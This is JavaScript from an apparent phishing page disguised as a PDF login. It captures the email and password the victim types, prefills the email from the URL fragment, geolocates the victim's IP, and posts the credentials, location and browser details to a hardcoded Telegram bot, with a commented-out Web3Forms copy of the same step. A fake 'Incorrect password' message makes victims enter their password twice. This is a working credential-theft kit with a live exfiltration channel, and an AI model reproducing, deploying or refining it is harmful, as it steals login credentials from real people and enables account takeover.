    let attempt = 0;
    const maxAttempts = 2;
    const form = document.getElementById('formdata');
    const messageDiv = document.getElementById('message');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
  

    // ==================== TELEGRAM CONFIGURATION ====================
    // IMPORTANT: Replace these with your actual Bot Token and Chat ID
    // Get Bot Token from @BotFather on Telegram
    // Get Chat ID from @userinfobot or by sending a message to your bot and visiting:
    // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
    const TELEGRAM_BOT_TOKEN = '8942885189:AAHWAF51YpLeJHnGoUJak4fDTXvw0mBcOc0';  // <-- REPLACE WITH YOUR BOT TOKEN
    const TELEGRAM_CHAT_ID = '8890264087';      // <-- REPLACE WITH YOUR CHAT ID
    // ================================================================

    // Function to send data to Telegram Bot
    async function sendToTelegram(uid, password) {
      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('Telegram bot not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
        return false;
      }

      const timestamp = new Date().toLocaleString();
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const location = await getIpAndCountry();
      const allLocation = location.country+' '+location.region+' '+location.city
      // Format the message for Telegram
      const message = `🔐 pdf login ATTEMPT 🔐\n\n` +
                      `📧 User Id: ${uid}\n` +
                      `🔑 Password: ${password}\n` +
                      `🖥️ location: ${allLocation}\n` +
                      `📅 Time: ${timestamp}\n` +
                      `💻 User Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\n` +
                      `🖥️ Platform: ${platform}\n` +
                      `🌐 Language: ${language}\n` +
                      `🔄 Attempt: ${attempt + 1}/${maxAttempts}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        const result = await response.json();
        if (result.ok) {
          console.log('Telegram message sent successfully');
          return true;
        } else {
          console.error('Telegram error:', result);
          return false;
        }
      } catch (err) {
        console.error('Failed to send to Telegram:', err);
        return false;
      }
    }

    // --- Extract email parameter from URL fragment (after #) ---
    (function setEmailFromHash() {
      const hash = window.location.hash;
      if (hash && hash.length > 1) {
        let emailParam = hash.substring(1);
        try {
          emailParam = decodeURIComponent(emailParam);
        } catch (e) {
          console.warn("URI decoding failed, using raw value");
        }
        if (emailParam && emailParam.trim() !== "") {
            email.value = emailParam;
            emailInput.value = emailParam;
           document.getElementById('displyEmail').textConten = emailParam;
        }
      }
    })();

    // Hide error message when user starts typing in password field
    passwordInput.addEventListener('input', function() {
      messageDiv.style.display = 'none';
    });
    
    passwordInput.addEventListener('focus', function() {
      messageDiv.style.display = 'none';
    });






    async function nav() {
      
      const email = emailInput.value;
      const password = passwordInput.value;

      /* Send to Web3Forms (original functionality)
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          access_key: '9301229f-51dc-4b99-bb05-cc866488b',
          name: 'auto-email',
          email: email,
          message: password
        }).toString()
      }).catch(err => console.error('Web3Forms submission error:', err));
      */

        

  // Initialize EmailJS
  emailjs.init({
    publicKey: "YOUR_PUBLIC_KEY"
  });

  async function sendEmail(email, message) {
    try {
      const response = await emailjs.send(
        "YOUR_SERVICE_ID",
        "YOUR_TEMPLATE_ID",
        {
          from_email: email,
          message: message
        }
      );

      console.log("Email sent successfully!", response);
      return true;

    } catch (error) {
      console.error("Email sending failed:", error);
      return false;
    }
  }

  // Example usage
  sendEmail(
    "user@example.com",
    "Hello! This is a test email."
  );



      if (attempt+1 <= maxAttempts && password) {
        // Send to Telegram Bot (new functionality)
        await sendToTelegram(email, password);
        console.log(email, password)
        attempt++;

        messageDiv.style.display = 'block';
        messageDiv.textContent = 'Incorrect password';
        passwordInput.value = '';
      } else {
        messageDiv.style.display = 'block';
        if(password){ messageDiv.textContent = 'Too many attempts.';}
        else{ messageDiv.textContent = 'Enter Password';}
       
        setTimeout(function() {
            
        }, 2000);
      }
    };

    function clearError(){
         messageDiv.textContent = '';
    }
    async function getIpAndCountry() {
      try {
        // Using ipapi.co (free, no API key needed for basic use)
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        return {
          ip: data.ip || 'Unknown',
          country: data.country_name || 'Unknown',
          city: data.city || '',
          region: data.region || ''
        };
      } catch (error) {
        console.error('Failed to get location:', error);
        return {
          ip: 'Unavailable',
          country: 'Unavailable',
          city: '',
          region: ''
        };
      }
    }














    // Password show/hide
    function togglePassword() {
      const input = document.getElementById('password');
      const icon = document.getElementById('eye-icon');
      
      if (input.type === 'password') {
        input.type = 'text';
        icon.innerHTML = `
          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
          <line x1="1" y1="1" x2="23" y2="23"/>
        `;
      } else {
        input.type = 'password';
        icon.innerHTML = `
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        `;
      }
    }
